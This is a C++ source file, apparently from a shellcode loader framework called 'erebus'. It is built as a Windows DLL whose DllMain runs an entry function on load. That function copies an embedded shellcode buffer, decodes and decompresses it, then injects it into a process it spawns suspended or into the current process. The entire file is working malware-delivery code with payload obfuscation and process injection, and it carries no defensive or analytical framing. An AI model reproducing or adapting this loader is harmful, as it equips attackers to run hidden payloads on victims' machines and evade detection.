#include "../include/shellcode.hpp"
#include "../include/loader.hpp"
// #include "../include/config.hpp" # Already imported in loader.hpp

// =========================================================================
// ENTRY POINT
// =========================================================================
VOID entry(void)
{
	erebus::config.injection_method = ExecuteShellcode;

	HANDLE process_handle = NULL;
	HANDLE thread_handle = NULL;

	// Allocate memory for shellcode on heap
	BYTE* pPayload = (BYTE*)malloc(sizeof(shellcode));
	if (!pPayload) return; // Allocation failed

	// Copy raw shellcode to heap
	memcpy(pPayload, shellcode, sizeof(shellcode));
	SIZE_T shellcode_size = sizeof(shellcode);
	if (shellcode_size == 0) {
		free(pPayload);
		return;
	}

	// ============================================================
	// 1. DEOBFUSCATE (via config-based approach)
	// ============================================================
	// These functions use CONFIG_ENCODING_TYPE, CONFIG_ENCRYPTION_TYPE, CONFIG_COMPRESSION_TYPE
	erebus::AutoDetectAndDecodeString((CHAR*)pPayload, shellcode_size, &pPayload, &shellcode_size);
	erebus::DecompressShellcode(&pPayload, &shellcode_size);

	// ============================================================
	// 2. TARGET PROCESS SETUP
	// ============================================================
#if CONFIG_INJECTION_MODE == 1
	// Remote Injection
	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
	if (!erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle)) {
		free(pPayload);
		return;
	}
#elif CONFIG_INJECTION_MODE == 2
	// Local Injection
	process_handle = NtCurrentProcess();
	thread_handle = NtCurrentThread();
#endif

	// ============================================================
	// 3. INJECT
	// ============================================================
	erebus::config.injection_method(pPayload, shellcode_size, process_handle, thread_handle);

	// Cleanup - securely zero memory before freeing
	RtlSecureZeroMemory(pPayload, shellcode_size);
	free(pPayload);

	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		entry();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
